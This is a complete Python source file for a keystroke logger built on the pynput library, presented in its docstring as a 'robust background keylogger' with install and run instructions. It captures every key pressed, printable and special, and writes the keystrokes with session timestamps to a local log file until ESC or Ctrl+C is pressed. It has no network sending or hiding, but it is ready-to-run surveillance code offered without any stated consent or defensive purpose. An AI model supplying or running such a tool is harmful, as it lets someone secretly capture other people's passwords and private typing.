"""
keylogger.py
------------
A robust background keylogger using pynput.

Features:
  - Logs all keystrokes (printable chars + special keys)
  - Timestamps each session start
  - Batched / buffered writes for performance
  - Graceful shutdown on ESC (or Ctrl+C)
  - Configurable output file and flush interval
  - Thread-safe buffer
  - Cross-platform (Windows, macOS, Linux)

Usage:
  pip install pynput
  python keylogger.py
"""

import threading
import signal
import sys
from datetime import datetime
from pathlib import Path
from typing import List, Optional
from pynput import keyboard

# ── Configuration ────────────────────────────────────────────────────────────
LOG_FILE       = "log.txt"          # Output file path
FLUSH_INTERVAL = 5                  # Seconds between automatic buffer flushes
STOP_KEY       = keyboard.Key.esc   # Key that stops the logger
# ─────────────────────────────────────────────────────────────────────────────


class KeyLogger:
    """Thread-safe keylogger with buffered file writes."""

    def __init__(self, log_file: str = LOG_FILE, flush_interval: float = FLUSH_INTERVAL):
        self.log_file      = Path(log_file)
        self.flush_interval = flush_interval
        self._buffer: List[str] = []
        self._lock         = threading.Lock()
        self._stop_event   = threading.Event()
        self._listener: Optional[keyboard.Listener] = None
        self._flush_timer: Optional[threading.Timer] = None

    # ── Internal helpers ──────────────────────────────────────────────────

    def _format_key(self, key) -> str:
        """Return a human-readable string for any key."""
        try:
            # Printable character
            return key.char if key.char is not None else f"[{key}]"
        except AttributeError:
            # Special key (Key.space, Key.enter, etc.)
            special = {
                keyboard.Key.space:     " ",
                keyboard.Key.enter:     "\n",
                keyboard.Key.tab:       "\t",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.delete:    "[DELETE]",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.shift:     "[SHIFT]",
                keyboard.Key.shift_r:   "[SHIFT]",
                keyboard.Key.ctrl_l:    "[CTRL]",
                keyboard.Key.ctrl_r:    "[CTRL]",
                keyboard.Key.alt_l:     "[ALT]",
                keyboard.Key.alt_r:     "[ALT]",
                keyboard.Key.cmd:       "[CMD]",
                keyboard.Key.up:        "[UP]",
                keyboard.Key.down:      "[DOWN]",
                keyboard.Key.left:      "[LEFT]",
                keyboard.Key.right:     "[RIGHT]",
                keyboard.Key.home:      "[HOME]",
                keyboard.Key.end:       "[END]",
                keyboard.Key.page_up:   "[PGUP]",
                keyboard.Key.page_down: "[PGDN]",
                keyboard.Key.esc:       "[ESC]",
                keyboard.Key.f1:  "[F1]",  keyboard.Key.f2:  "[F2]",
                keyboard.Key.f3:  "[F3]",  keyboard.Key.f4:  "[F4]",
                keyboard.Key.f5:  "[F5]",  keyboard.Key.f6:  "[F6]",
                keyboard.Key.f7:  "[F7]",  keyboard.Key.f8:  "[F8]",
                keyboard.Key.f9:  "[F9]",  keyboard.Key.f10: "[F10]",
                keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
            }
            return special.get(key, f"[{key}]")

    def _write_to_buffer(self, text: str) -> None:
        with self._lock:
            self._buffer.append(text)

    def _flush_buffer(self) -> None:
        """Write buffered keystrokes to disk and reschedule the timer."""
        with self._lock:
            if self._buffer:
                content = "".join(self._buffer)
                self._buffer.clear()
                try:
                    with open(self.log_file, "a", encoding="utf-8") as f:
                        f.write(content)
                except OSError as e:
                    print(f"[KeyLogger] Write error: {e}", file=sys.stderr)

        # Reschedule unless we're shutting down
        if not self._stop_event.is_set():
            self._flush_timer = threading.Timer(self.flush_interval, self._flush_buffer)
            self._flush_timer.daemon = True
            self._flush_timer.start()

    # ── pynput callbacks ──────────────────────────────────────────────────

    def _on_press(self, key) -> Optional[bool]:
        """Called for every key-down event."""
        if key == STOP_KEY:
            self.stop()
            return False          # Tells pynput to stop the listener

        self._write_to_buffer(self._format_key(key))

    def _on_release(self, key) -> None:
        """Called for every key-up event (currently unused)."""
        pass

    # ── Public API ────────────────────────────────────────────────────────

    def start(self) -> None:
        """Start logging. Blocks until stop() is called or STOP_KEY is pressed."""
        # Write a session header
        header = f"\n\n{'='*60}\nSession started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*60}\n"
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(header)

        print(f"[KeyLogger] Logging to '{self.log_file}'. Press ESC to stop.")

        # Start the periodic flush timer
        self._flush_timer = threading.Timer(self.flush_interval, self._flush_buffer)
        self._flush_timer.daemon = True
        self._flush_timer.start()

        # Start the keyboard listener (blocking)
        with keyboard.Listener(on_press=self._on_press, on_release=self._on_release) as listener:
            self._listener = listener
            listener.join()   # Blocks here until listener stops

        # Final flush after listener exits
        self._flush_buffer()
        print("[KeyLogger] Stopped. Log saved.")

    def stop(self) -> None:
        """Signal the logger to stop gracefully."""
        self._stop_event.set()
        if self._flush_timer:
            self._flush_timer.cancel()
        if self._listener and self._listener.is_alive():
            self._listener.stop()


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    logger = KeyLogger(log_file=LOG_FILE, flush_interval=FLUSH_INTERVAL)

    # Allow Ctrl+C to also stop gracefully
    def _sigint_handler(sig, frame):
        print("\n[KeyLogger] Interrupted.")
        logger.stop()

    signal.signal(signal.SIGINT, _sigint_handler)
    logger.start()


if __name__ == "__main__":
    main()